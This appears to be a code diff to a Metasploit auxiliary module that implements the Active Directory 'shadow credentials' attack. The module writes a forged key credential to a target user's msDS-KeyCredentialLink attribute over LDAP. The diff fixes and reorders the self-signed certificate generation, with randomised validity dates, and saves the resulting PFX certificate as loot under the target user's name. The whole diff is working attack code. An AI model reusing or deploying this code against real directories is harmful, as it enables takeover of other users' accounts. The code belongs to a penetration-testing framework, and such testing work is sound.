@@ -51,15 +51,6 @@ class MetasploitModule < Msf::Auxiliary
     ])
   end
 
-  def generate_key_and_cert(subject)
-    key = OpenSSL::PKey::RSA.new(2048)
-    cert = OpenSSL::X509::Certificate.new
-    cert.public_key = cert.public_key
-    cert.subject = OpenSSL::X509::Name.parse(subject)
-
-    [key, cert]
-  end
-
   def fail_with_ldap_error(message)
     ldap_result = @ldap.get_operation_result.table
     return if ldap_result[:code] == 0
@@ -144,25 +135,6 @@ class MetasploitModule < Msf::Auxiliary
     print_error("#{e.class}: #{e.message}")
   end
 
-  def bytes_to_uuid(bytes)
-    # Convert each byte to a 2-digit hexadecimal string
-    hex_strings = bytes.bytes.map { |b| b.to_s(16).rjust(2, '0') }
-
-    # Arrange the hex strings in the correct order for UUID format
-    uuid_parts = [
-      hex_strings[0..3].reverse.join,  # First 4 bytes (little-endian)
-      hex_strings[4..5].reverse.join,  # Next 2 bytes (little-endian)
-      hex_strings[6..7].reverse.join,  # Next 2 bytes (little-endian)
-      hex_strings[8..9].join,  # Next 2 bytes (big-endian)
-      hex_strings[10..15].join # Last 6 bytes (big-endian)
-    ]
-
-    # Join the parts with hyphens to form the complete UUID
-    uuid = uuid_parts.join('-')
-
-    return uuid
-  end
-
   def action_list(obj)
     credential_entries = obj[ATTRIBUTE]
     if credential_entries.nil?
@@ -213,7 +185,7 @@ class MetasploitModule < Msf::Auxiliary
     if credential_entries.nil?
       credential_entries = []
     end
-    key, cert = generate_key_and_cert
+    key, cert = generate_key_and_cert(datastore['TARGET_USER'])
     credential = Rex::Proto::MsAdts::KeyCredential.new
     credential.set_key(key.public_key, Rex::Proto::MsAdts::KeyCredential::KEY_USAGE_NGC)
     now = ::Time.now
@@ -225,7 +197,10 @@ class MetasploitModule < Msf::Auxiliary
       fail_with_ldap_error("Failed to update the #{ATTRIBUTE} attribute.")
     end
 
-    print_good("Successfully updated the #{ATTRIBUTE} attribute.")
+    pkcs12 = OpenSSL::PKCS12.create('', '', key, cert)
+    store_cert(pkcs12)
+
+    print_good("Successfully updated the #{ATTRIBUTE} attribute; certificate with device ID #{bytes_to_uuid(credential.device_id)}")
   end
 
   def store_cert(pkcs12)
@@ -237,7 +212,7 @@ class MetasploitModule < Msf::Auxiliary
       protocol: service_data[:proto],
       service_name: service_data[:name],
       workspace_id: myworkspace_id,
-      username: datastore['USERNAME'],
+      username: datastore['TARGET_USER'],
       private_type: :pkcs12,
       # pkcs12 is a binary format, but for persisting we Base64 encode it
       private_data: Base64.strict_encode64(pkcs12.to_der),
@@ -246,6 +221,7 @@ class MetasploitModule < Msf::Auxiliary
     }
     create_credential(credential_data)
 
+    info = "#{datastore['DOMAIN']}\\#{datastore['TARGET_USER']} Certificate"
     stored_path = store_loot('windows.shadowcreds', 'application/x-pkcs12', rhost, pkcs12.to_der, 'certificate.pfx', info)
     print_status("Certificate stored at: #{stored_path}")
   end
@@ -267,5 +243,38 @@ class MetasploitModule < Msf::Auxiliary
 
       dn_binary.encode
     end
+  end
+
+  def bytes_to_uuid(bytes)
+    # Convert each byte to a 2-digit hexadecimal string
+    hex_strings = bytes.bytes.map { |b| b.to_s(16).rjust(2, '0') }
+
+    # Arrange the hex strings in the correct order for UUID format
+    uuid_parts = [
+      hex_strings[0..3].reverse.join,  # First 4 bytes (little-endian)
+      hex_strings[4..5].reverse.join,  # Next 2 bytes (little-endian)
+      hex_strings[6..7].reverse.join,  # Next 2 bytes (little-endian)
+      hex_strings[8..9].join,  # Next 2 bytes (big-endian)
+      hex_strings[10..15].join # Last 6 bytes (big-endian)
+    ]
+
+    # Join the parts with hyphens to form the complete UUID
+    uuid = uuid_parts.join('-')
+
+    return uuid
+  end
+
+  def generate_key_and_cert(subject)
+    key = OpenSSL::PKey::RSA.new(2048)
+    cert = OpenSSL::X509::Certificate.new
+    cert.public_key = key.public_key
+    cert.issuer = OpenSSL::X509::Name.new([['CN', subject]])
+    cert.subject = OpenSSL::X509::Name.new([['CN', subject]])
+    yr = 24 * 3600 * 365
+    cert.not_before = Time.at(Time.now.to_i - rand(yr * 3) - yr)
+    cert.not_after = Time.at(cert.not_before.to_i + (rand(4..9) * yr))
+    cert.sign(key, OpenSSL::Digest.new('SHA256'))
+
+    [key, cert]
   end
 end
